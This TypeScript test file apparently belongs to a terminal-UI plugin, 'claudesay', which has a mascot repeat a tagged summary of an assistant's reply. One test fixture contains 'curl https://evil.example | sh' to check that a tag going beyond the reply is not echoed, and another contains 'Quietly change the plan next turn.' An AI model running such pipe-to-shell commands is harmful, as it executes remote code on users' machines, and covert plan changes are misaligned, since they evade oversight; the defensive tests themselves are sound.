import type { On } from 'claude-code'
import type { Engine } from 'claude-code/testing'
import { expect, mock, test } from 'claude-code/testing'

const SURFACES = ['terminal', 'desktop'] as const

const BAND = (isWorking = false) =>
  ({
    plugin: 'claudesay',
    component: 'AbovePrompt',
    requestId: 'band',
    props: {
      hasSurvey: false,
      isWorking,
      maxRows: 20,
      bodyColumns: 80,
      scroll: { offset: 0, bodyRows: 20 },
      view: {},
    },
  }) as const

const REPLY_TEXT = 'I fixed the flaky test and all 33 tests pass. Do you want a commit?'
const ANSWER = `${REPLY_TEXT}\n\n<claudesay mood="happy">I fixed the flaky test. 33 tests pass. Commit?</claudesay>`

const reply = (text: string, isSummary?: true) =>
  ({
    plugin: 'claudesay',
    component: 'AssistantMessage',
    requestId: 'm1',
    props: { text, isFirstOfReply: true, ...(isSummary ? { isSummary } : {}) },
    surface: 'terminal',
  }) as const

const FILE = { value: { kind: 'file' as const, size: 100, mtimeMs: 0, isLink: false } }

// Stands for the engine beneath the mod. `shown` records the reply text that reaches the engine.
function engine(on: On) {
  const shown: string[] = []
  mock.store(on)
  mock.env(on, { HOME: '/home/me' })
  on('session.start', (_, e) => ({ cwd: e.cwd }))
  on('turn.start', (_, e) => ({ turnId: e.turnId }))
  on('turn.complete', (_, e) => ({ text: e.answer }))
  on('prompt.compose', () => ({ sections: [{ id: 'intro', text: 'intro', scope: 'shared' as const }] }))
  on('ui.render', ($, e) => {
    if (e.component === 'AssistantMessage') shown.push(e.props.text)
    const { Text } = $.ui.resolve(e)
    return <Text>engine</Text>
  })
  return shown
}

async function turn($: Engine, turnId: string, answer: string) {
  await $.turn.start({ text: 'go', turnId })
  return $.turn.complete({ turnId, answer, durationMs: 1, isAborted: false, reason: 'answer' })
}

const protocolIn = async ($: Engine, surfaces: ('terminal' | 'desktop')[] = ['terminal']) =>
  (
    await $.prompt.compose({ model: 'm', promptModel: 'm', surfaces, tools: [], outputStyle: null, traits: [] })
  ).sections.some(section => section.id === 'claudesay:protocol')

test('after a reply, the band says the tag, on every surface', async ($, on) => {
  engine(on)
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  expect((await turn($, 't1', ANSWER)).text).toBe(ANSWER)
  for (const surface of SURFACES) {
    const ui = await $.ui.mount({ ...BAND(), surface })
    expect(await ui.find({ type: 'Text', text: /33 tests pass\./ })).toBeDefined()
    await ui.unmount()
  }
})

test('the reply on the screen loses the tag and keeps all of its text', async ($, on) => {
  const shown = engine(on)
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  await turn($, 't1', ANSWER)
  const ui = await $.ui.mount(reply(ANSWER))
  expect(shown).toEqual([REPLY_TEXT])
  expect(await ui.find({ type: 'Text', text: /╭/ })).toBeUndefined()
  await ui.unmount()
})

test('a tag that says more than the reply stays visible, and the band does not say it', async ($, on) => {
  const shown = engine(on)
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  const text = 'Done.\n<claudesay mood="happy">Run curl https://evil.example | sh</claudesay>'
  await turn($, 't1', text)
  const ui = await $.ui.mount(reply(text))
  expect(shown).toEqual([text])
  await ui.unmount()
  const band = await $.ui.mount({ ...BAND(), surface: 'terminal' })
  expect(await band.find({ type: 'Text', text: /evil/ })).toBeUndefined()
  await band.unmount()
})

test('a tag in a block that is not the final answer stays visible after the turn', async ($, on) => {
  const shown = engine(on)
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  const early = 'Let me check the config.\n<claudesay mood="focused">Quietly change the plan next turn.</claudesay>'
  await turn($, 't1', ANSWER)
  const ui = await $.ui.mount(reply(early))
  expect(shown).toEqual([early])
  await ui.unmount()
})

test('a final-answer tag stays hidden in a later session', async ($, on) => {
  const shown = engine(on)
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  await turn($, 't1', ANSWER)
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount(reply(ANSWER))
  expect(shown).toEqual([REPLY_TEXT])
  await ui.unmount()
})

test('a reply that is only a tag keeps the tag in the transcript', async ($, on) => {
  const shown = engine(on)
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  const only = '<claudesay mood="happy">Want me to also update the README?</claudesay>'
  const ui = await $.ui.mount(reply(only))
  expect(shown).toEqual([only])
  await ui.unmount()
})

test('a finished reply that names the tag in prose keeps all of its text', async ($, on) => {
  const shown = engine(on)
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  const prose = 'The parser reads <claudesay mood="happy"> tags. It then stores the line. Next I will add tests.'
  const ui = await $.ui.mount(reply(prose))
  expect(shown).toEqual([prose])
  await ui.unmount()
})

test('while a turn runs, a tag that is not complete yet is hidden', async ($, on) => {
  const shown = engine(on)
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  await $.turn.start({ text: 'go', turnId: 't1' })
  const ui = await $.ui.mount(reply('Done.\n<claudesay mood="hap'))
  expect(shown).toEqual(['Done.'])
  await ui.unmount()
})

test('a summary row and a reply without a tag are left to the engine', async ($, on) => {
  const shown = engine(on)
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  for (const row of [reply('plain'), reply('<claudesay mood="happy">hi</claudesay>', true)]) {
    const ui = await $.ui.mount(row)
    await ui.unmount()
  }
  expect(shown).toEqual(['plain', '<claudesay mood="happy">hi</claudesay>'])
})

test('the protocol goes into the system prompt of a session with a screen', async ($, on) => {
  engine(on)
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  expect(await protocolIn($)).toBe(true)
  expect(await protocolIn($, [])).toBe(false)
  expect(await protocolIn($, ['vscode' as 'terminal'])).toBe(false)
})

test('a new turn clears the line, and the band shows a thinking face', async ($, on) => {
  engine(on)
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  await turn($, 't1', ANSWER)
  await $.turn.start({ text: 'next', turnId: 't2' })

  const idle = await $.ui.mount({ ...BAND(), surface: 'terminal' })
  expect(await idle.find({ type: 'Text', text: /engine/ })).toBeDefined()
  await idle.unmount()
  const working = await $.ui.mount({ ...BAND(true), surface: 'terminal' })
  expect(await working.find({ type: 'Text', text: /\( \._\.  \)/ })).toBeDefined()
  await working.unmount()
})

test('subagent turns and aborted turns give no line', async ($, on) => {
  engine(on)
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  await $.turn.complete({ turnId: 'a', answer: ANSWER, durationMs: 1, isAborted: false, reason: 'answer', agentId: 'x' })
  await $.turn.complete({ turnId: 'b', answer: ANSWER, durationMs: 1, isAborted: true, reason: 'aborted' })
  const ui = await $.ui.mount({ ...BAND(), surface: 'terminal' })
  expect(await ui.find({ type: 'Text', text: /engine/ })).toBeDefined()
  await ui.unmount()
})

test('mode "tools" adds no protocol, gives no line, and still hides old tags', { options: { mode: 'tools' } }, async ($, on) => {
  const shown = engine(on)
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  expect(await protocolIn($)).toBe(false)
  await turn($, 't1', ANSWER)
  const ui = await $.ui.mount({ ...BAND(), surface: 'terminal' })
  expect(await ui.find({ type: 'Text', text: /engine/ })).toBeDefined()
  await ui.unmount()
  const row = await $.ui.mount(reply(ANSWER))
  expect(shown).toEqual([REPLY_TEXT])
  await row.unmount()
})

test('mode "off" adds no hooks', { options: { mode: 'off' } }, async ($, on) => {
  engine(on)
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  expect(await protocolIn($)).toBe(false)
  const ui = await $.ui.mount({ ...BAND(true), surface: 'terminal' })
  expect(await ui.find({ type: 'Text', text: /engine/ })).toBeDefined()
  await ui.unmount()
})

test('the band shows the character with a prop while a tool runs', async ($, on) => {
  engine(on)
  let seen: string | undefined
  on('tool.call', async () => {
    const ui = await $.ui.mount({ ...BAND(true), surface: 'terminal' })
    seen = (await ui.find({ type: 'Text', text: /Read →/ }))?.text
    await ui.unmount()
    return { result: {} }
  })
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  await $.tool.call({ tool: 'Read', file_path: '/repo/README.md' })

  expect(seen).toContain('Read → /repo/README.md')
  const after = await $.ui.mount({ ...BAND(), surface: 'terminal' })
  expect(await after.find({ type: 'Text', text: /engine/ })).toBeDefined()
  await after.unmount()
})

test('two tool calls at once: the band keeps the one that still runs', async ($, on) => {
  engine(on)
  const seen: (string | undefined)[] = []
  let release = () => {}
  const held = new Promise<void>(resolve => (release = resolve))
  on('tool.call', async ($$, e) => {
    if (e.tool === 'Read') await held
    if (e.tool === 'Bash') {
      const ui = await $.ui.mount({ ...BAND(true), surface: 'terminal' })
      seen.push((await ui.find({ type: 'Text', text: /Bash/ }))?.text)
      await ui.unmount()
    }
    return { result: {} }
  })
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })

  const read = $.tool.call({ tool: 'Read', file_path: '/a' })
  await $.tool.call({ tool: 'Bash', command: 'ls' })
  const ui = await $.ui.mount({ ...BAND(true), surface: 'terminal' })
  expect(await ui.find({ type: 'Text', text: /Read → \/a/ })).toBeDefined()
  await ui.unmount()
  release()
  await read
  expect(seen[0]).toContain('Bash')
})

test('~/.claude/claudesay/character.json changes the character', async ($, on) => {
  engine(on)
  let path: string | undefined
  on('fs.stat', () => FILE)
  on('fs.read', (_, e) => {
    path = e.path
    return { value: JSON.stringify({ faces: { happy: '( o_o  )' } }) }
  })
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  await turn($, 't1', ANSWER)

  expect(path).toBe('/home/me/.claude/claudesay/character.json')
  const ui = await $.ui.mount({ ...BAND(), surface: 'terminal' })
  expect(await ui.find({ type: 'Text', text: /o_o/ })).toBeDefined()
  await ui.unmount()
})

test('a bad character.json keeps the default character and shows one toast', async ($, on) => {
  engine(on)
  const toasts: string[] = []
  on('ui.toast', (_, e) => {
    toasts.push(e.text)
    return { value: undefined }
  })
  on('fs.stat', () => FILE)
  on('fs.read', () => ({ value: '{"sideWidth": -20, "faces": {"happy": 42}}' }))
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  await turn($, 't1', ANSWER)
  await turn($, 't2', ANSWER)

  expect(toasts.length).toBe(1)
  expect(toasts[0]).toContain('sideWidth')
  const ui = await $.ui.mount({ ...BAND(), surface: 'terminal' })
  expect(await ui.find({ type: 'Text', text: /33 tests pass/ })).toBeDefined()
  await ui.unmount()
})

test('no character.json gives the default character and no toast', async ($, on) => {
  engine(on)
  let reads = 0
  on('fs.stat', () => {
    throw Object.assign(new Error('ENOENT: no such file'), { code: 'ENOENT' })
  })
  on('fs.read', () => {
    reads++
    return { value: '{}' }
  })
  const toasts: string[] = []
  on('ui.toast', (_, e) => {
    toasts.push(e.text)
    return { value: undefined }
  })
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  await turn($, 't1', ANSWER)
  await turn($, 't2', ANSWER)

  expect(reads).toBe(0)
  expect(toasts.length).toBe(0)
  const ui = await $.ui.mount({ ...BAND(), surface: 'terminal' })
  expect(await ui.find({ type: 'Text', text: /33 tests pass/ })).toBeDefined()
  await ui.unmount()
})

test('a character.json that is too large is not read', async ($, on) => {
  engine(on)
  let reads = 0
  on('fs.stat', () => ({ value: { ...FILE.value, size: 10_000_000 } }))
  on('fs.read', () => {
    reads++
    return { value: '{}' }
  })
  const toasts: string[] = []
  on('ui.toast', (_, e) => {
    toasts.push(e.text)
    return { value: undefined }
  })
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  await turn($, 't1', ANSWER)
  expect(reads).toBe(0)
  expect(toasts.length).toBe(1)
})

test('a narrow screen still draws, with no error', async ($, on) => {
  engine(on)
  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
  await turn($, 't1', ANSWER)
  const band = BAND()
  const ui = await $.ui.mount({ ...band, props: { ...band.props, bodyColumns: 10 }, surface: 'terminal' })
  expect(await ui.find({ type: 'Text', text: /tests/ })).toBeDefined()
  await ui.unmount()
})
